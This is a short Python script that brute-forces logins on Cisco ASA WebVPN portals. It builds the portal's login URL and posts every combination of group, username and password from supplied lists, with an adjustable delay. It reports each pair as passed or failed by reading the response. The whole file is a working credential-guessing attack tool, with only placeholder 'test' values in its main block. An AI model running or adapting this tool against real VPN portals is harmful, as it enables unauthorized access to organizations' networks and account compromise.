from colorama import Fore, Back, Style
import requests
import time
import ssl
import validators
from urllib.parse import urlparse


def check_target(target):
	url = ""
	if validators.url(target):
		check =  urlparse(target)		
		url = f"https://{check.hostname}/+webvpn+/index.html"
	else:
		url =  f"https://{target}/+webvpn+/index.html"
	return url	

def validate_login(username, password, request):
    if "document.location.replace" in request.text:
        print(
            f"{Fore.BLUE}> {Fore.RED}[-]{Fore.RED} Failed:{Style.RESET_ALL} {username}:{password}")
    else:
        print(
            f"{Fore.BLUE}> {Fore.CYAN}[+]{Fore.GREEN} Passed:{Style.RESET_ALL} {username}:{password}")
    return 0


def attack(target, usernames, passwords, groups, rate):
    cookies = {"webvpnlogin": "1", "webvpnLang": "en"}
    timeout = 0.5
    if rate != 0:
        timeout = rate

    for group in groups:
        for username in usernames:
            for password in passwords:
                data = f"tgroup=&next=&tgcookieset=&group_list={group}&username={username}&password={password}&Login=Login"
                # print(data)
                r = requests.post(url=target, cookies=cookies,
                                  data=data, verify=True, )
                validate_login(username, password, r)
                time.sleep(timeout)

    return 0


if __name__ == "__main__":
    username = 'test'
    passwd = 'test'
    groups = 'test'
    target = check_target('test')

    result = attack(target=target, usernames=username,
           passwords=passwd, groups=groups, rate=1)
    print(result)
    
